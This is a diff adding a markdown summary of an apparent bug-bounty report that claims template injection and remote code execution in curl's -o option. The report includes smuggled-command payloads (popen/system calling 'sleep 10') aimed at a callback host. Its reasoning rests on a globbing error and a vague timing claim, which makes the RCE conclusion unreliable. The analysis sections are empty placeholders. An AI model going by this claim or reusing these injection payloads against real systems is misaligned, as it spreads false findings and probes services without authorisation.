@@ -1,0 +1,93 @@
+# SSTI leads to Command injection
+
+## Metadata
+- **Source:** HackerOne
+- **Report:** 3584149 | https://hackerone.com/reports/3584149
+- **Submitted:** 2026-03-04
+- **Reporter:** errorbehavior200
+- **Program:** Unknown
+- **Bounty:** Not disclosed
+- **Severity:** none
+- **Vuln:** Command Injection - Generic
+- **CVEs:** None
+- **Category:** web-api
+
+## Summary
+## Summary:
+Hi ,team 
+i 'am new reasercher search for pleasure excuse me for poor technical details.
+the parmeter os is vulnerable to SSTI leads to command injection
+## Affected version
+curl/7.55.1
+
+
+## Steps To Reproduce:
+i tried to injected the os parmeter
+```
+curl -os{popen('sleep 10').read()} --url gyvgzienwleealjmudejwl83p3p29bxi9.oast.fun
+```
+the reponse error:
+
+```
+curl: (3) [globbing] unma
+
+## Attack scenario
+*(see original)*
+
+## Root cause
+*(see original)*
+
+## Attacker mindset
+*(see original)*
+
+## Defensive takeaways
+*(see original)*
+
+## Variant hunting
+*(see original)*
+
+## MITRE ATT&CK
+*(see original)*
+
+## Notes
+*(see original)*
+
+## Full report
+<details><summary>Expand</summary>
+
+## Summary:
+Hi ,team 
+i 'am new reasercher search for pleasure excuse me for poor technical details.
+the parmeter os is vulnerable to SSTI leads to command injection
+## Affected version
+curl/7.55.1
+
+
+## Steps To Reproduce:
+i tried to injected the os parmeter
+```
+curl -os{popen('sleep 10').read()} --url gyvgzienwleealjmudejwl83p3p29bxi9.oast.fun
+```
+the reponse error:
+
+```
+curl: (3) [globbing] unmatched close brace/bracket in column 12
+```
+
+for honesty i used gemni to inject command
+
+```
+curl -os{system("sleep 10")}.read --url gyvgzienwleealjmudejwl83p3p29bxi9.oast.fun
+```
+the reponse 200 ok 
+and the request wait 10 ms for finished
+
+## Impact
+
+## Summary:
+unhanticated Rce via command line with sleep break the server until finish the request
+
+</details>
+
+---
+*Analysed by Claude on 2026-05-24*
